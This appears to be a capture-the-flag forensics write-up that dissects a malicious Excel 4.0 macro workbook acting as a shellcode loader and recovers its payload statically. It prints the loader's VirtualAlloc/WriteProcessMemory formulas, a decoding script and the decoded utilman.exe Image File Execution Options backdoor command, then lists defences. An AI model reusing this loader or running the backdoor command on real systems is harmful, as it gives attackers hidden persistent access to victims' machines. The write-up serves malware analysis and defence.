---
layout: post
title: "Free Services"
date: 2027-09-01 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, maldoc, xlm, excel4-macro, shellcode, cwe-506, oletools]
---

## Overview

A document-malware (maldoc) challenge: you're handed `free_decryption.xlsm`, the attachment from a phishing email that claims it can "recover your memory." The catch — `olevba` swears there are no macros. The malicious logic is an **Excel 4.0 (XLM) macro** hidden in a macrosheet, acting as an in-memory **shellcode loader**. The whole thing is recovered statically, without ever opening Excel.

## The technique

`.xlsx`/`.xlsm` files are just ZIP archives. The first move on any "no macros found" maldoc is to unzip it and inspect the parts directly — VBA scanners only see VBA projects, and they routinely miss Excel 4.0 macros, which live in `xl/macrosheets/` as plain cell formulas.

This sample's macrosheet is a textbook shellcode loader. It uses the [embedded malicious code](https://cwe.mitre.org/data/definitions/506.html) pattern (CWE-506): allocate executable memory, copy in a block of bytes that have been XOR-obfuscated, and execute. Everything needed to decode it — the XOR key, the data range, and the read order — is written right in the formulas.

## Solution

`olevba` reports nothing useful, which is itself the tell:

```bash
olevba free_decryption.xlsm
# Type: OpenXML
# No VBA or XLM macros found.
```

Unzip the container and look at the structure:

```bash
unzip free_decryption.xlsm -d x
ls x/xl/                       # macrosheets/  worksheets/  workbook.xml ...
grep -o '<sheet name="[^"]*"' x/xl/workbook.xml
# <sheet name="MRaaS"
# <sheet name="Macro1"        <-- the Excel 4.0 macro sheet
```

The macrosheet `x/xl/macrosheets/sheet1.xml` holds the loader as cell formulas, plus a block of numbers in columns `E:G`:

```text
A2  =CALL("Kernel32","VirtualAlloc","JJJJJ",0,386,4096,64)   ; alloc 386 RWX bytes
A4  =FOR("counter",0,772,2)                                  ; loop
A5  =SET.VALUE(B1, CHAR(BITXOR(ACTIVE.CELL(), 24)))          ; per-byte XOR, key = 24
A6  =CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, A2+C1, B1, LEN(B1), 0)
A8  =SELECT(, "RC[2]")                                       ; advance active cell 2 cols
A9  =NEXT()
```

Reading the loader gives every decode parameter: the **XOR key** is the `BITXOR` argument (`24`); the **data block** is the `SELECT(E1:G258)` range; the **read order** is `SELECT(,"RC[2]")` — the active cell advances 2 columns each step, which over a 3-column selection is equivalent to advancing the row-major index by 2 (387 bytes total, matching `FOR 0..772 step 2`).

Decode it statically — no detonation:

Create `solve.py`:

```python
#!/usr/bin/env python3
import re
d = open("x/xl/macrosheets/sheet1.xml").read()

vals = {}
for m in re.finditer(r'<c r="([A-Z]+)(\d+)"[^>]*>(.*?)</c>', d, re.S):
    col, row, inner = m.group(1), int(m.group(2)), m.group(3)
    v = re.search(r'<v>(-?\d+)</v>', inner)
    if v and col in ("E", "F", "G"):
        vals[(row, col)] = int(v.group(1))

linear = [vals.get((r, c), 0) for r in range(1, 259) for c in ("E", "F", "G")]
sc = bytes((linear[i] ^ 24) & 0xff for i in range(0, len(linear), 2))
open("shellcode.bin", "wb").write(sc)

print("head:", sc[:16].hex())
for s in re.findall(rb'[ -~]{4,}', sc):
    print(s.decode(errors="replace"))
```

```bash
python3 solve.py
```

The decoded head is `fce882000000...` — the classic Metasploit `block_api` x86 stub (`cld; call`). The printable strings expose the real payload: an **Image File Execution Options accessibility backdoor** (MITRE T1546.008) that hijacks `utilman.exe`, with the flag echoed inline:

```text
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f;echo "HTB{...}"
```

Flag value redacted — it falls straight out of running `solve.py`.

## Why it worked

Excel 4.0 macros are a 1990s feature Excel still executes, and detection tooling focuses on VBA — so XLM macros slip past content scanners (here, even past `olevba`'s own report). Storing the shellcode as **numeric cell values** behind a **per-byte XOR** hides it from string and entropy scanners; the bytes only become code when Excel's loader runs them. But because the key, range, and traversal step are all literally spelled out in the formulas, the obfuscation is completely reversible offline.

## Fix / defense

- Disable Excel 4.0 macros by GPO/registry (`EnableXLMMacros=0`; `VBAWarnings=4` for signed-only).
- Enable the Defender ASR rule **"Block Win32 API calls from Office macros"** — it stops `VirtualAlloc`/`WriteProcessMemory` originating from the macro engine.
- Mark Office files from email/web as Protected View and require digitally signed macros.
- Triage by inspecting `xl/macrosheets/*` directly, or with oletools' `XLMMacroDeobfuscator` / `olevba --deobf` — never a VBA-only scanner.
